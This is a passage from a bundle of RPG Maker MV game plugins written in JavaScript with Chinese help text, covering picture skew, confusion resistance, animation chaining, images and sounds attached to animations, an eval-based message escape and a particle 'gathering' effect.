		this._skewX=this._skewTX;
		this._skewY=this._skewTY;
	}
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateSkew();
	return rtv;
});

new cfc(Sprite_Picture.prototype).add('updateOther',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateSkew();
	return rtv;
}).add('updateSkew',function f(){
	const pic=this.picture();
	this.skew.set(pic._skewX||0,pic._skewY||0);
});

})();


﻿"use strict";
/*:
 * @plugindesc 技能/道具抗混亂
 * @author agold404
 * @help <confuseResisted> 對使用者作用的直接抗
 * <canBeConfused> 會變成可被混亂，有 <confuseResisted> 時無效。
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Action.prototype).add('isConfuseResisted',function f(){
	{ const item=this.item(),meta=item&&item.meta; if(meta){
	if(meta.confuseResisted) return true;
	if(meta.canBeConfused) return false;
	} }
	if(this.isForUser()) return true;
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc 動畫接動畫。需動畫外部note
 * @author agold404
 * @help 外部note
 * <concatAnimationsFrame:動畫id>
 * 或
 * <concatAnimationsFrame:[動畫id,動畫id,...]>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Sprite_Animation.prototype).add('setup',function f(target, animation, mirror, delay, rate){
	const rtv=f.ori.apply(this,arguments);
	this.concatAnimationFrame(animation);
	return rtv;
}).add('concatAnimationFrame',function f(ani,currSet){
	const meta=ani&&ani.meta;
	const raw=meta&&meta[f.tbl[0]]; if(!raw) return;
	meta[f.tbl[0]]=undefined;
	currSet=currSet||[];
	if(currSet.uniqueHas(ani)){ throw new Error(f.tbl[1]+ani.id); return; }
	currSet.uniquePush(ani);
	const arr=[].concat_inplace(JSON.parse(raw));
	for(let x=0,xs=arr.length;x!==xs;++x){
		const nxt=$dataAnimations[arr[x]]; if(!nxt) continue;
		f.call(this,nxt,currSet);
		const oriTotalFrame=ani.frames.length;
		for(let t=0,tarr=nxt.timings,ts=tarr.length;t!==ts;++t){
			const info={}; for(let k in tarr[t]) info[k]=tarr[t][k];
			info.frame+=oriTotalFrame;
			ani.timings.push(info);
		}
		ani.frames.concat_inplace(nxt.frames);
	}
},[
"concatAnimationsFrame",
"動畫接動畫接到循環了: ",
]);

})();


﻿"use strict";
/*:
 * @plugindesc 動畫帶圖
 * @author agold404
 * @help external note of animation: <pictures>
[
{
"id":"自訂辨識該圖的名稱，之後使用同樣名稱的話不會再產生新的圖片",
"animationFrames":[0,123],
"endType":"keep",
"imgPath":"img/圖片路徑/圖片名稱.png",
"isJsImgPath":false,
"imgOrigin":"center",
"imgReflect":true,
"positionNotReflect":true,
"positionReference":"target",
"imgFrame":[[0,0,200,100],[0,200,200,100]],
"position":[[0,0],[234,123]],
"isJsPosition":false,
"scale":[[1,1],[2,3]],
"isJsScale":false,
"alpha":[0,1],
"isJsAlpha":false,
"rotate":[0,720],
"isJsRotate":false,
"skew":[[360,360],[330,300]],
"isJsSkew":false,
"dz":0.1,
"isJsDz":false,
"blendMode":0,
"isJsBlendMode":false,
},
{
"id":"自訂辨識該圖的名稱，之後使用同樣名稱的話不會再產生新的圖片",
"animationFrames":[124,134],
"其他欄位":"下略"
}
]
animationFrames: 數字為動畫第幾格。第幾個數字對應到下面其他陣列ㄉ欄位第幾個。線性變化。
 // the timing anchor points.
endType: "keep" or "remove", any unsupported value is treated as "remove"
 // what to do if an img meets its end.
imgOrigin: "center" or "100,200" (x座標100,y座標200的地方) or "10%,20%" (圖片x座標10%,y座標20%的地方(左邊、上面是0%；右邊、下面是100%)). default "center"
 // where's the reference point in the img.
imgReflect: true or false, false-like or true-like will be accepted. default false.
 // wheather reflect or not this image if the animation is mirrored.
positionNotReflect: true or false, false-like or true-like will be accepted. default false.
 // wheather reflect or not the position if the animation is mirrored.
isJsImgPath: true or false, false-like or true-like will be accepted. default false.
 // the imgPath is eval()-ed.
isJsPosition: true or false, false-like or true-like will be accepted. default false.
 // the position values of x and y are eval()-ed respectively.
isJsScale: true or false, false-like or true-like will be accepted. default false.
 // the scale values of x and y are eval()-ed respectively.
isJsSkew: true or false, false-like or true-like will be accepted. default false.
 // the skew values of x and y are eval()-ed respectively.
isJsRotate: true or false, false-like or true-like will be accepted. default false.
 // the rotate values are eval()-ed respectively.
isJsDz: true or false, false-like or true-like will be accepted. default false.
 // the delta Z values are eval()-ed respectively.
isJsAlpha: true or false, false-like or true-like will be accepted. default false.
 // the alpha values are eval()-ed respectively.
isJsBlendMode: true or false, false-like or true-like will be accepted. default false.
positionReference: "target" or "screen", any unsupported value is treated as "screen"
 // positioning referencing of target or the screen.
imgFrame: [ [0,0,"100%","100%"] ,...] 或 [ [0,0,234,123] ,...]
 // positioning the image, anchored by each point in animationFrame.
position: [ [0,0] ,...] // offset x and y
 // positioning the image, anchored by each point in animationFrame.
scale: [ [1,1] ,...] // scale x and y
 // scaling the image, anchored by each point in animationFrame.
rotate: [ 0 ,...] // rotate degree. 360 per cycle.
 // rotating the image, anchored by each point in animationFrame.
skew: [ [360,360] ,...] // skew x and y. 360 per cycle.
 // skewing the image, anchored by each point in animationFrame.
dz: [ 1 ,...] // z軸要比動畫多多少。預設1。<0表示在下面；>0表示在上面；0的話則戰鬥和地圖中會有不同。
blendMode: 同動畫編輯器的 blendMode 。預設0。0:原色；1:add；2:multiply；3:screen(?)
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(DataManager).add('parseAnimationPictures',function f(animation,effectBattler,spAni){
	const meta=animation&&animation.meta;
	if(!meta||!meta.pictures) return;
	let arr=animation.pictures;
	if(!arr){
		const isPrintDebug=Utils.isOptionValid('test');
		let hasJsEval=false;
		arr=animation.pictures=JSON.parse(meta.pictures);
		const xs=arr.length; if(!(0<xs)) return;
		const imgs=arr._imgs=[];
		const byFrames=arr._byFrames=[];
		{ let maxFrame=0; for(let x=0;x!==xs;++x) maxFrame=Math.max(maxFrame,Math.max.apply(null,arr[x].animationFrames)+1||0);
		const frms=animation.frames; if(frms&&frms.push) while(maxFrame>=frms.length) frms.push([]);
		for(let frm=maxFrame+1;frm--;) (byFrames[frm]=[])._ids=new Map(); // +1 above and +1 here for end mark
		}
		// put data per animation frame
		for(let x=0;x!==xs;++x){ const info=arr[x]; if(!info||!info.imgPath) continue;
			const frms=info.animationFrames;
			const timePointCnt=frms&&frms.length;
			if(!timePointCnt) continue;
			if(!info.imgFrame ) info.imgFrame =[f.tbl[0].imgFrame ];
			if(!info.position ) info.position =[f.tbl[0].position ];
			if(!info.scale    ) info.scale    =[f.tbl[0].scale    ];
			if(!info.alpha    ) info.alpha    =[f.tbl[0].alpha    ];
			if(!info.rotate   ) info.rotate   =[f.tbl[0].rotate   ];
			if(!info.skew     ) info.skew     =[f.tbl[0].skew     ];
			if(!info.dz       ) info.dz       =[f.tbl[0].dz       ];
			if(!info.blendMode) info.blendMode= f.tbl[0].blendMode;
			if( JSON.stringify(frms)!==JSON.stringify(frms.sort(f.tbl[1])) ) alert(f.tbl[2].replace("{}",x+''));
			{ const tbl=f.tbl[3];
			tbl._func(tbl,'endType',info);
			tbl._func(tbl,'positionReference',info);
			}
			info.imgReflect=!!info.imgReflect;
			info.positionNotReflect=!!info.positionNotReflect;
			const imgPath=info.isJsImgPath?f.tbl[6](isPrintDebug,info.imgPath,info,animation,effectBattler,spAni):info.imgPath;
			if(info.isJsImgPath) hasJsEval=true;
			imgs.uniquePush(imgPath);
			const isJsPosition=info.isJsPosition;
			if(isJsPosition){ const t='position';
				const curr=info[t][0];
				curr[0]=f.tbl[7](isPrintDebug,curr[0],undefined,t,info,animation,effectBattler,spAni);
				curr[1]=f.tbl[7](isPrintDebug,curr[1],undefined,t,info,animation,effectBattler,spAni);
				hasJsEval=true;
			}
			const isJsScale=info.isJsScale;
			if(isJsScale){ const t='scale';
				const curr=info[t][0];
				curr[0]=f.tbl[7](isPrintDebug,curr[0],undefined,t,info,animation,effectBattler,spAni);
				curr[1]=f.tbl[7](isPrintDebug,curr[1],undefined,t,info,animation,effectBattler,spAni);
				hasJsEval=true;
			}
			const isJsSkew=info.isJsSkew;
			if(isJsSkew){ const t='skew';
				const curr=info[t][0];
				curr[0]=f.tbl[7](isPrintDebug,curr[0],undefined,t,info,animation,effectBattler,spAni);
				curr[1]=f.tbl[7](isPrintDebug,curr[1],undefined,t,info,animation,effectBattler,spAni);
				hasJsEval=true;
			}
			const isJsRotate=info.isJsRotate;
			if(isJsRotate){ const t='rotate';
				const curr=info[t][0];
				info[t][0]=f.tbl[7](isPrintDebug,curr,undefined,t,info,animation,effectBattler,spAni);
				hasJsEval=true;
			}
			const isJsDz=info.isJsDz;
			if(isJsDz){ const t='dz';
				const curr=info[t][0];
				info[t][0]=f.tbl[7](isPrintDebug,curr,undefined,t,info,animation,effectBattler,spAni);
				hasJsEval=true;
			}
			const isJsAlpha=info.isJsAlpha;
			if(isJsAlpha){ const t='alpha';
				const curr=info[t][0];
				info[t][0]=f.tbl[7](isPrintDebug,curr,undefined,t,info,animation,effectBattler,spAni);
				hasJsEval=true;
			}
			const isJsBlendMode=info.isJsBlendMode;
			if(isJsBlendMode){ const t='blendMode';
				const curr=info[t];
				info[t]=f.tbl[7](isPrintDebug,curr,undefined,t,info,animation,effectBattler,spAni);
				hasJsEval=true;
			}
			const blendMode=info.blendMode;
			frms.push(frms.back-0+1);
			for(let tp=1;tp<=timePointCnt;++tp){
				if(null==info.imgFrame[tp]) info.imgFrame[tp]=info.imgFrame[tp-1];
				if(null==info.position[tp]) info.position[tp]=info.position[tp-1];
				if(null==info.scale   [tp]) info.scale   [tp]=info.scale   [tp-1];
				if(null==info.alpha   [tp]) info.alpha   [tp]=info.alpha   [tp-1];
				if(null==info.rotate  [tp]) info.rotate  [tp]=info.rotate  [tp-1];
				if(null==info.skew    [tp]) info.skew    [tp]=info.skew    [tp-1];
				if(null==info.dz      [tp]) info.dz      [tp]=info.dz      [tp-1];
				if(isJsPosition){ const t='position';
					const curr=info[t][tp],pre=info[t][tp-1];
					curr[0]=f.tbl[7](isPrintDebug,curr[0],pre[0],t,info,animation,effectBattler,spAni);
					curr[1]=f.tbl[7](isPrintDebug,curr[1],pre[1],t,info,animation,effectBattler,spAni);
				}
				if(isJsScale){ const t='scale'
					const curr=info[t][tp],pre=info[t][tp-1];
					curr[0]=f.tbl[7](isPrintDebug,curr[0],pre[0],t,info,animation,effectBattler,spAni);
					curr[1]=f.tbl[7](isPrintDebug,curr[1],pre[1],t,info,animation,effectBattler,spAni);
				}
				if(isJsSkew){ const t='skew';
					const curr=info[t][tp],pre=info[t][tp-1];
					curr[0]=f.tbl[7](isPrintDebug,curr[0],pre[0],t,info,animation,effectBattler,spAni);
					curr[1]=f.tbl[7](isPrintDebug,curr[1],pre[1],t,info,animation,effectBattler,spAni);
				}
				if(isJsRotate){ const t='rotate';
					const curr=info[t][tp],pre=info[t][tp-1];
					info[t][tp]=f.tbl[7](isPrintDebug,curr,pre,t,info,animation,effectBattler,spAni);
				}
				if(isJsDz){ const t='dz';
					const curr=info[t][tp],pre=info[t][tp-1];
					info[t][tp]=f.tbl[7](isPrintDebug,curr,pre,t,info,animation,effectBattler,spAni);
				}
				if(isJsAlpha){ const t='alpha';
					const curr=info[t][tp],pre=info[t][tp-1];
					info[t][tp]=f.tbl[7](isPrintDebug,curr,pre,t,info,animation,effectBattler,spAni);
				}
				for(let strtFrm=frms[tp-1]-0,endFrm=frms[tp]-0,widthFrm=endFrm-strtFrm,frm=strtFrm;frm!==endFrm;++frm){
					const r=(frm-strtFrm)/widthFrm;
					byFrames[frm].push({
						id:info.id,
						endType:info.endType,
						imgPath:imgPath,
						imgOrigin:info.imgOrigin,
						imgReflect:info.imgReflect,
						positionNotReflect:info.positionNotReflect,
						positionReference:info.positionReference,
						imgFrame:f.tbl[4](info.imgFrame[tp-1],info.imgFrame[tp],r),
						position:f.tbl[4](info.position[tp-1],info.position[tp],r),
						scale:f.tbl[4](info.scale[tp-1],info.scale[tp],r),
						alpha:f.tbl[4](info.alpha[tp-1],info.alpha[tp],r),
						rotate:f.tbl[4](info.rotate[tp-1],info.rotate[tp],r),
						skew:f.tbl[4](info.skew[tp-1],info.skew[tp],r),
						dz:f.tbl[4](info.dz[tp-1],info.dz[tp],r),
						blendMode:blendMode,
					});
					const m=byFrames[frm]._ids;
					if(m.get(info.id)!=="keep") m.set(info.id,info.endType);
				}
			}
			frms.pop(); // restore for doing it again (debug purpose)
		}
		// mark remove
		byFrames[0]._removes=new Set();
		for(let frm=1,endFrm=byFrames.length;frm!==endFrm;++frm){
			const s=byFrames[frm]._removes=new Set();
			const m0=byFrames[frm-1]._ids;
			const m1=byFrames[frm]._ids;
			m0.forEach(f.tbl[5].bind(f.tbl[3].endType,s,m1));
		}
		if(hasJsEval) delete animation.pictures;
	}
	return arr;
},[
{
imgFrame:[0,0,"100%","100%"],
position:[0,0],
scale:[1,1],
alpha:1,
rotate:0,
skew:[0,0],
dz:1,
blendMode:0,
}, // 0: default value
(a,b)=>a-b, // 1: cmp
"WARNING: 從 0 開始數的第 {} 個動畫設定的 animationFrames 不是遞增\n這可能導致非預期的呈現結果", // 2: warning string
{
_func:(tbl,key,info)=>{
	const defaultInfo=tbl[key];
	if(!defaultInfo[0].has(info[key])) info[key]=defaultInfo[1];
}, // 3-_func
endType:[new Set(t=["keep","remove"]),"remove"], // 3-endType: supported values, default value
positionReference:[new Set(t=["target","screen"]),"screen"], // 3-positionReference: supported values, default value
}, // 3: default values
function f(a,b,r){ if(b==null) b=a;
	if(a===b) return b;
	let rtv;
	if(a instanceof Array){ rtv=[]; for(let x=0,xs=a.length;x!==xs;++x) rtv[x]=f(a[x],b[x],r); }
	else{
		let tmp;
		tmp=a-0; if(!isNaN(tmp)) a=tmp;
		tmp=b-0; if(!isNaN(tmp)) b=tmp;
		const fa=a!=null&&(a.constructor===String);
		if(fa!==(b!=null&&(b.constructor===String))) throw new Error("using Number then String or vice versa is not supported.\n"+a+'\n'+b);
		if(fa){
			if(!f.tbl) f.tbl=[DataManager._re_parsePercent];
			const ma=a.match(DataManager._re_parsePercent); if(!ma) throw new Error("invalid string in animation note: <pictures: ... >\n"+a);
			const mb=b.match(DataManager._re_parsePercent); if(!mb) throw new Error("invalid string in animation note: <pictures: ... >\n"+b);
			return (ma[1]*(1-r)+mb[1]*r)+"%";
		}else rtv=a*(1-r)+b*r;
	}
	return rtv;
}, // 4: interpolate
function f(s,m1,v,k){ if(v===this[1]&&!m1.has(k)) s.add(k); }, // 5: add it to set if it is "remove" and not presented in m1
(isPrintDebug,s,info,ani,effectBattler,spAni)=>{
	const oriS=s;
	const errMsg=isPrintDebug?"getting undefined with non-empty string starting with non-'//' in 'imgPath' in:\n animation "+ani.id+", img id="+info.id+"\n code:\n"+s:s;
	let k,r,t,cfc,rtv;
	{ rtv=eval(s); }
	if(rtv===undefined&&oriS&&oriS.match&&!oriS.match(/^\/\//)) throw new Error(errMsg);
	return rtv;
}, // 6: eval imgPath
(isPrintDebug,s,pre,type_,info,ani,effectBattler,spAni)=>{
	if(s==null||!isNaN(s-0)) return s-0;
	const errMsg=isPrintDebug?"getting the evaluated value is not a number in '"+type_+"' in:\n animation "+ani.id+", img id="+info.id+"\n code:\n"+s:s;
	let k,r,t,cfc,rtv;
	{ rtv=eval(s)-0; }
	if(isNaN(rtv)) throw new Error(errMsg);
	return rtv;
}, // 7: eval number
],false,true).add('parseAnimationPictures_number',function f(bmp,x,y){
	const rtv=[x,y];
	rtv[0]=f.tbl[0](bmp.width,x);
	rtv[1]=f.tbl[0](bmp.height,y);
	return rtv;
},[
function f(ref,s){
	if(s===undefined) return;
	if(!f.tbl) f.tbl=[DataManager._re_parsePercent];
	if(s&&s.constructor===String){ const m=s.match(f.tbl[0]); if(m){
		return m[1]/100*ref;
	} }
	return s;
},
],false,true).add('parseAnimationPictures_apply',function f(sp,bmp,info){
	bmp.addLoadListener(f.tbl[0].bind(this,info,f.tbl[1],sp,bmp));
},[
function f(info,tbl,spRoot,bmp){
	const origin=info.imgOrigin;
	const frm=info.imgFrame;
	const scale=info.scale;
	const alpha=info.alpha;
	const rotate=info.rotate;
	const skew=info.skew;
	const imgReflect=info.imgReflect;
	let imgOrigin=info.imgOrigin;
	//const loc=info.position; // set in updatePosition
	const sp=spRoot.children[0];
	
	let tmp;
	tmp=DataManager.parseAnimationPictures_number(bmp,frm[0],frm[1]); frm[0]=tmp[0]; frm[1]=tmp[1];
	tmp=DataManager.parseAnimationPictures_number(bmp,frm[2],frm[3]); frm[2]=tmp[0]; frm[3]=tmp[1];
	
	sp.setFrame(frm[0],frm[1],frm[2],frm[3]);
	//sp.position.set(loc[0],loc[1]); // set in updatePosition
	sp.scale.set(!imgReflect&&this._mirror?-scale[0]:scale[0],scale[1]);
	sp.alpha=alpha;
	sp.rotation=rotate/180.0*Math.PI;
	sp.skew.set(skew[0]/180.0*Math.PI,skew[1]/180.0*Math.PI);
	if(!f.tbl) f.tbl=["center",];
	if(!origin||origin===f.tbl[0]) sp.anchor.set(0.5);
	else if(origin){
		let xy=origin.split(',');
		xy=DataManager.parseAnimationPictures_number(bmp,xy[0],xy[1]);
		sp.anchor.set(xy[0]/bmp.width,xy[1]/bmp.height);
	}
	spRoot.scale.x=this._mirror?-1:1;
},
DataManager.parseAnimationPictures.tbl[3].positionReference,
],false,true).getP()._re_parsePercent=/[ \t]*([0-9]+(\.[0-9]+)?)%[ \t]*/;

new cfc(Sprite_Animation.prototype).add('setup',function f(target, animation, mirror, delay, rate){
	const rtv=f.ori.apply(this,arguments);
	this.setupPictures(animation);
	return rtv;
}).add('getEffectBattler',function f(){
	let rtv=this._target;
	const ori=rtv;
	while(rtv && !(rtv instanceof Sprite_Battler)) rtv=rtv.parent;
	if(!rtv) rtv=ori;
	return rtv;
}).add('setupPictures',function f(animation){
	const arr=this._pictureArr=DataManager.parseAnimationPictures(animation,this.getEffectBattler(),this);
	if(!arr) return;
	arr._bmp=new Map();
	for(let x=0,xs=arr._imgs.length;x!==xs;++x) arr._bmp.set(arr._imgs[x],ImageManager.loadNormalBitmap(arr._imgs[x]));
	this.setupDuration();
}).add('findTimingData',function f(frameIndex){
	const rtv=f.ori.apply(this,arguments);
	this.findTimingData_pictures(frameIndex);
	return rtv;
}).add('findTimingData_pictures',function f(frameIndex){
	if(!this._pictureArr) return;
	if(!this._pictures) this._pictures=new Map(); // id -> sp
	const byFrames=this._pictureArr._byFrames;
	const infos=byFrames&&byFrames[frameIndex];
	if(!infos) return;
	
	this._pictures.forEach(f.tbl[0].bind(this,infos));
	for(let x=0,xs=infos.length;x!==xs;++x){ const info=infos[x];
		const id=info.id;
		let sp=this._pictures.get(id);
		if(!sp){ this._pictures.set(id,sp=new Sprite()); this.parent.addChild(sp); sp.addChild(new Sprite()); }
		sp.children[0].blendMode=info.blendMode-0||0;
		const bmp=sp.children[0].bitmap=this._pictureArr._bmp.get(info.imgPath); if(!bmp) continue;
		DataManager.parseAnimationPictures_apply.call(this,sp,bmp,info);
		sp._currInfo=info;
		sp.z=this.z+info.dz;
	}
	this.updatePosition_pictures();
},[
function f(infos,v,k){
	if(infos._removes.has(k)){
		this._pictures.delete(k);
		if(v) v.destroy();
	}
},
],false,true).add('updatePosition',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updatePosition_pictures();
	return rtv;
}).add('updatePosition_pictures',function f(){
	if(this._pictures){
		if(0<this._duration) this._pictures.forEach(f.tbl[0].bind(this,f.tbl[1]));
		else this._pictures.forEach(f.tbl[2]);
	}
},[
function f(tbl,v,k){
	const info=v._currInfo; if(!info) return;
	const positionNotReflected=info.positionNotReflected;
	const loc=info.position;
	let x,y;
	if(tbl[1]===info.positionReference){ // screen
		if(!positionNotReflected&&this._mirror) x=Graphics.boxWidth  -loc[0];
		else x=loc[0];
		y=loc[1];
	}else{
		const ref=this._target;
		if(!positionNotReflected&&this._mirror) x=ref.x-loc[0];
		else x=ref.x+loc[0];
		y=ref.y+loc[1];
	}
	v.position.set(x,y);
},
DataManager.parseAnimationPictures.tbl[3].positionReference,
(v,k)=>v.destroy(),
],false,true);

})();


﻿"use strict";
/*:
 * @plugindesc 動畫帶音效
 * @author agold404
 * @help external note of animation: <seAudios>
[
[frame_from_0,audio_file_path,pan,pitch,volume]
]
pan: 0 is balanced ; -1: left ; 1: right
pitch: 1 is normal
volume: 1 is normal
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(DataManager).add('parseAnimationSeAudios',function f(animation){
	const meta=animation&&animation.meta;
	if(!meta||!meta.seAudios) return;
	let arr=animation.seAudios;
	if(!arr){
		arr=animation.seAudios=JSON.parse(meta.seAudios);
		const xs=arr.length; if(!(0<xs)) return;
		const byFrames=arr._byFrames=[];
		for(let x=0;x!==xs;++x){
			const info=arr[x];
			const frmInfos=byFrames[info[0]]=byFrames[info[0]]||[];
			frmInfos.push(info);
		}
		for(let x=0,frms=byFrames.length;x!==frms;++x) byFrames[x]=byFrames[x]||[];
	}
	return arr;
});

new cfc(Sprite_Animation.prototype).add('updateFrame',function f(){
	this.updateFrame_seAudios();
	return f.ori.apply(this,arguments);
}).add('updateFrame_seAudios',function f(){
	const seAudios=DataManager.parseAnimationSeAudios(this._animation); if(!seAudios) return;
	const byFrames=seAudios._byFrames;
	const infos=byFrames&&byFrames[this.currentFrameIndex()]; if(!infos) return;
	for(let x=0,xs=infos.length;x!==xs;++x){
		const info=infos[x];
		const pan=info[2]*100||0;
		const pitch=isNaN(info[3])?100:info[3]*100;
		const volume=isNaN(info[4])?100:info[4]*100;
		AudioManager.playSe({name:info[1],pan:pan,pitch:pitch,volume:volume});
	}
});

})();


﻿"use strict";
/*:
 * @plugindesc \EVALTOSTR:"..."
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Message.prototype).add('add',function f(txt){
	arguments[0]=(arguments[0]+'').replace(f.tbl[0],f.tbl[1]);
	return f.ori.apply(this,arguments);
},t=[
/(?<!\\)((\\\\)*)\\EVALTOSTR:("((\\\\)*\\"|[^"\\]|\\[^"])*")/g,
function(){ return arguments[1]+eval(JSON.parse(arguments[3])); },
]);

new cfc(Window_Base.prototype).add('drawTextEx',function f(text, x, y, _buf_for_idiotRMMV, _buf2, textState){
	arguments[0]=(arguments[0]+'').replace(f.tbl[0],f.tbl[1]);
	return f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc SceneManager.gathering_gen / SceneManager.集氣_gen 
 * @author agold404
 * @help .
 *
SceneManager.集氣_gen(345,234,0.5,4,Graphics.boxWidth>>1,Graphics.boxHeight>>1,"img/pictures/3_石頭.png",[[1.0/2,"img/pictures/3_石頭.png"],[1.0/2,"img/pictures/3_布.png"],[1.0/2,"img/pictures/3_剪刀.png"]],64,16);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(SceneManager).add('集氣_getCont',function f(){
	let rtv=this._集氣; if(!rtv) rtv=this._集氣=[];
	return rtv;
}).add('集氣_gen',function f(totalFrames,newChildFrames,childrenPerFrame,finalScale,x0,y0,mainPicPath,otherPicPaths,fadeOutFrames,fadeInFrames,initScale,opt){
	/*
	mainPicPath: string
	otherPicPaths: [[scale,string], ... ]
	*/
	const sc=this._scene; if(!sc) return -1;
	
	totalFrames|=0;
	newChildFrames|=0;
	childrenPerFrame-=0;
	fadeOutFrames|=0;
	fadeInFrames|=0;
	if(!(totalFrames>=fadeOutFrames+fadeInFrames)||!(0<childrenPerFrame)||!otherPicPaths||!otherPicPaths.length) return -2;
	opt=opt||{};
	
	const bmp=ImageManager.loadNormalBitmap(mainPicPath);
	const info={
		mainPicPath:mainPicPath,
		otherPicPaths:otherPicPaths,
		scene:sc,
		currFrame:0,
		totalFrames:totalFrames,
		newChildFrames:newChildFrames,
		fadeOutFrames:fadeOutFrames,
		fadeInFrames:fadeInFrames,
		initScale:initScale||0,
		finalScale:finalScale,
		childrenPerFrame_config:childrenPerFrame,
		childrenPerFrame_curr:0,
		x0:x0,
		y0:y0,
		childStartDist:opt.childStartDist||f.tbl[0].childStartDist,
		childFrames_2:(opt.childFrames||f.tbl[0].childFrames)>>1,
		childSpeed:opt.childSpeed||f.tbl[0].childSpeed,
		childMaxAlpha:opt.childMaxAlpha||f.tbl[0].childMaxAlpha,
		follow:opt.follow,
		opt:opt,
		sp:new Sprite(bmp),
		root:new Sprite(),
	};
	bmp.addLoadListener(this.集氣_onload.bind(info.sp));
	this.集氣_getCont().push(info);
	info.sp.alpha=0;
	info.root.position.set(x0,y0);
	info.root.addChild(info.sp);
	info.root.addChild(info.root._cs=new Sprite());
	sc.addChild(info.root);
	// TODO: rtv
	return info;
},[
{
childStartDist:[0.25,1.125],
childFrames:64,
childSpeed:[1.0/256,1.0/16],
childMaxAlpha:[0.25,0.75],
},
]).add('集氣_update_rootPosition',function f(info){
	if(info.follow){ const xy=info.follow.getGlobalPosition(); info.root.position.set(info.x0+(xy.x||0),info.y0+(xy.y||0)); }
}).add('集氣_update',function f(){
	let i=0,j=0,arr=this.集氣_getCont();
	for(const sc=this._scene,sz=arr.length,pi2=Math.PI*2;j!==sz;++j){ const info=arr[j];
		const sp=info.sp;
		const r=(++info.currFrame/info.totalFrames);
		if(sc!==info.scene||!(1>=r)){ info.root.destroy(); continue; }
		const fadingFrames=info.totalFrames-info.currFrame;
		if(info.currFrame<info.fadeInFrames) info.sp.alpha=info.currFrame/info.fadeInFrames;
		else if(fadingFrames<info.fadeOutFrames) info.sp.alpha=fadingFrames/info.fadeOutFrames;
		else if(info.sp.alpha!==1) info.sp.alpha=1;
		if(info.sp.bitmap.isReady()){
			this.集氣_update_rootPosition(info);
			const distScale=info.finalScale-info.initScale;
			const scale=info.initScale+r*distScale;
			if(scale){ info.sp.visible=true; info.sp.scale.set(scale); }
			else info.sp.visible=false;
			const childFrames=info.childFrames_2<<1;
			if(info.newChildFrames>=info.currFrame){ for(info.childrenPerFrame_curr+=info.childrenPerFrame_config;info.childrenPerFrame_curr>=0;--info.childrenPerFrame_curr){
				const choice=info.otherPicPaths.rnd1();
				const bmp=ImageManager.loadNormalBitmap(choice[1]);
				const newsp=new Sprite(bmp);
				bmp.addLoadListener(this.集氣_onload.bind(newsp));
				newsp.scale.set(choice[0]);
				const dist1=info.sp._r;
				const d=(Math.random()*(info.childStartDist[1]-info.childStartDist[0])+info.childStartDist[0])*dist1*Math.max(scale,1);
				const r=Math.random()*pi2;
				const sin=Math.sin(r),cos=Math.cos(r);
				newsp.position.set(sin*d,cos*d);
				newsp._curr=childFrames;
				let spd=(Math.random()*(info.childSpeed[1]-info.childSpeed[0])+info.childSpeed[0])*dist1;
				if(d<spd*newsp._curr) spd=d/newsp._curr;
				newsp._spdx=-sin*spd;
				newsp._spdy=-cos*spd;
				newsp._maxAlpha=Math.random()*(info.childMaxAlpha[1]-info.childMaxAlpha[0])+info.childMaxAlpha[0];
				info.root._cs.addChild(newsp);
			} }
			// update children
			const delList=[];
			for(let x=0,cs=info.root._cs.children,xs=cs.length;x!==xs;++x){
				const c=cs.getnth(x); if(!(0<--c._curr)){ delList.push(c); continue; }
				c.position.set(c.x+c._spdx,c.y+c._spdy);
				c.alpha=((info.childFrames_2-Math.abs(c._curr-info.childFrames_2))/info.childFrames_2)*c._maxAlpha;
			}
			for(let c;c=delList.pop();) c.destroy();
		}
		arr[i++]=info;
	}
	arr.length=i;
}).add('集氣_onload',function f(bmp){
	this.anchor.set(0.5);
	this._r=Math.max(bmp.width,bmp.height);
}).add('updateScene',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.集氣_update();
	return rtv;
}).add('gathering_gen',function f(
	totalFrames,newChildFrames,childrenPerFrame,finalScale,
	x0,y0,
	mainPicPath,otherPicPaths,
	fadeOutFrames,fadeInFrames,initScale,
	opt,
){
	return this.集氣_gen.apply(this,arguments);
});

t=[]; t.length=2;
new cfc(Sprite.prototype).add('集氣_gen',t[0]=function f(
	totalFrames,newChildFrames,childrenPerFrame,finalScale,
	x0,y0,
	mainPicPath,otherPicPaths,
	fadeOutFrames,fadeInFrames,initScale,
	opt,
){
	const a=SceneManager;
	const rtv=a.集氣_gen.apply(a,arguments);
	rtv.follow=this;
	return rtv;
}).add('gathering_gen',t[1]=function f(
	totalFrames,newChildFrames,childrenPerFrame,finalScale,
	x0,y0,
	mainPicPath,otherPicPaths,
	fadeOutFrames,fadeInFrames,initScale,
	opt,
){
	return this.集氣_gen.apply(this,arguments);
});

Window_Base.prototype.集氣_gen=t[0];
Window_Base.prototype.gathering_gen=t[1];

})();


﻿"use strict";
/*:
 * @plugindesc Splitting Spriteset
 * @author agold404
 * @help SceneManager.splittedRenderedSpriteset_start(dur,holdDur,ptx,pty,slope,width,height,endFlashDur,endFlashColor);
 * SceneManager.splittedRenderedSpriteset_gen(order,dur,holdDur,ptx,pty,slope,width,height,endFlashDur,endFlashColor);
 * 
 * SceneManager.splittedRenderedSpriteset_start(33,16,444,222,3,123/3,123,16,[0,0,0,255]);
 * SceneManager.splittedRenderedSpriteset_gen(4,33,16,444,222,3,123/3,123,16,[0,0,0,255]);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const p=Spriteset_Base.prototype,pp=Sprite.prototype;
new cfc(p).add('renderCanvas',p.renderCanvas===pp.renderCanvas?function(renderer){
	return this._renderCanvas_split(Sprite.prototype.renderCanvas,arguments);
}:function f(renderer){
	return this._renderCanvas_split(f.ori,arguments);
}).add('renderWebGL',p.renderWebGL===pp.renderWebGL?function(renderer){
	return this._renderWebGL_split(Sprite.prototype.renderWebGL,arguments);
}:function f(renderer){
